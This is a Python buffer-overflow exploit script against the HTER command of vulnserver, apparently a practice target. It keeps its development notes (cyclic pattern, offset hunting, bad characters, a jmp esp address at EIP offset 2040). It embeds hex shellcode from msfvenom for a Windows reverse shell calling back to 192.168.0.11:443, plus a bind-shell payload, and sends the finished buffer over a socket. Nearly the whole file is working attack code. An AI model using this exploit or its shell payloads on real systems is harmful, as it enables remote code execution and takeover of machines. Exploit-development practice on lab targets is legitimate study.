#!/usr/bin/python

import os
import sys
import socket

host = "192.168.0.12"
port = 9999

#!mona pc 2054 didnt work as application treat payload as hex 
#pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq"
'''
only 0-9 and a-f worked
'''
'''
overwrite with bbbbbbbb
exploit = "HTER "
exploit += "1" * 200
exploit += "2" * 200
exploit += "3" * 200
exploit += "4" * 200
exploit += "5" * 200
exploit += "6" * 200
exploit += "7" * 200
exploit += "8" * 200
exploit += "9" * 200
exploit += "a" * 200
exploit += "b" * 50

overwrite with 67666666
exploit = "HTER "
exploit += "A" * 2000
exploit += "1" * 8
exploit += "2" * 8
exploit += "3" * 8
exploit += "4" * 8
exploit += "5" * 8
exploit += "6" * 8
exploit += "7" * 2

overwrite with 23221211
exploit = "HTER "
exploit += "A"*2040
exploit += "1" * 4
exploit += "2" * 4
exploit += "3" * 2
'''
'''
exploit = "HTER "
exploit += "A"*2041
exploit += "B"*8
exploit += "C"
'''
#bad chars
'''
first 0 will be removed 
00B7F60C  12 34 56 78 9A BC DE F0 12 34 56 78 9A BC DE FA 
00B7F61C  AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA 
00B7F62C  AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA 
00B7F63C  AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA 
00B7F64C  AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA 
exploit = "HTER "
exploit += "0123456789ABCDEF0123456789abcdef"
exploit += "A" * (total - 32)
'''
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.11 LPORT=443 -b "\x00" -a x86 --platform windows -f hex
#Payload size: 351 bytes
shellcode = "ba2c29e4ddd9e8d97424f45829c9b15283e8fc31500e037c27062880df44d37820295d9d116939d6025949baae121f2e245688418dddee6c0e4dd2ef8c8c07cfad5e5a0ee9839742a2c80a72c78596f99b089f1e6b2a8eb1e77510302b0e192a282bd3c19ac7e203d328486adbda90abdc04e7c51eb8f0125c667480c6ed2e6cf622a8e7f48fbeaf181112c4259a950aacd8b18ef4bbd897506de4c73ad2408cd707f9cfbfe430ef3f63429c0d2cf80a3ea526cd419c9f41bc1fe0487b4bb0e2aaf45bf25321cba2fb9aac12bc4a457833b4758399dd1c7e4a22488081ca8b8094b10566fcd54331694fcec90890c4b40b1aeb49c5eb8659b21bdd031523cb2bf9b690ab74ab0efcd11d4768cc04f18e0dd03a0aca21c4939f1ee283599eaef735c978a1f3a3ca1baa1885cb2b53168d33bee0718517b58e2af031f75660bd22d390f46e723951fbc62462d60551e1d2f5a6f997f0e3bd44897c286a3e7c79"

bind = "dbc8ba777ec7a3d97424f45e31c9b15383c60431561303216d255631792b99c97a4c132c4b4c4725fc7c036bf1f7419f827a4e902330a89fb46988be3670dd6006bb10614fa6d93318ac4ca32df84c487decd4ad360ff4604c56d68381e25f9bc6cf16103cbba8f00c44063da1b7567a06282d7274d536410601b251a0c264bd5006f2365ee3701043f2552b7f7f58fb093b7fdf529f1e463f4e1e98e02fbad30d3bb7be5988fa409a868d33a80926db80c2e01ce6f855b21903a69bdd57f6b3f4d79d43f80d0b4b5ffe2eb61faeee18c8a4e047e8c62ae0813ad50fe9b233651d93ec11dfc0248620231d2068259a4f69638cc7e26008f6f4ac386f623aa9c2123be0b4b7ae6f44b1d2271396253ef10a1fe8e7d6f9d3a30c3add2ac006f93c1c864568f0d113c6b68bd5b06067bc54f44b7f22f98109ca487c4cf565e8588e9b88a74518b8edc70951a8920b3c4b494f39c87b30bed00e35fa56e347933203fb9416"

# 0x625011b1 : jmp eax |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\gurana\Desktop\vulnserver\essfunc.dll)
#eip = "b1115062"
#0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\gurana\Desktop\vulnserver\essfunc.dll)
eip = "af115062"
eip_offset = 2040

# same eip offset but more space in stack 
total = 3000
total1 = 4105

align = "50"
align += "5c"
align += "90"*32
nop = "90" * 32
exploit = "HTER 0"
exploit += align
exploit += bind
exploit += "A" * (eip_offset - len(align) - len(bind))
exploit += eip
exploit += nop + bind + "C" * (total1 - eip_offset - 8 - 1 - len(align) - len(bind) - len(nop))
'''
# 7 * 256 = 1792, 2308 remains
#12111111
exploit = "HTER "
exploit += "A" * 2041
exploit += "1" * 8
exploit += "2" * 20
exploit += "d" * 20
exploit += "3" * 20
exploit += "4" * 20
exploit += "5" * 20
exploit += "6" * 20
exploit += "7" * 20
exploit += "8" * 20
exploit += "9" * 20
exploit += "a" * 20
exploit += "b" * 20
exploit += "c" * 20
exploit += "a" * (total1 - len(exploit))
'''


print (len(exploit))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.recv(1024)
s.send(exploit)
s.recv(1024)

s.close()

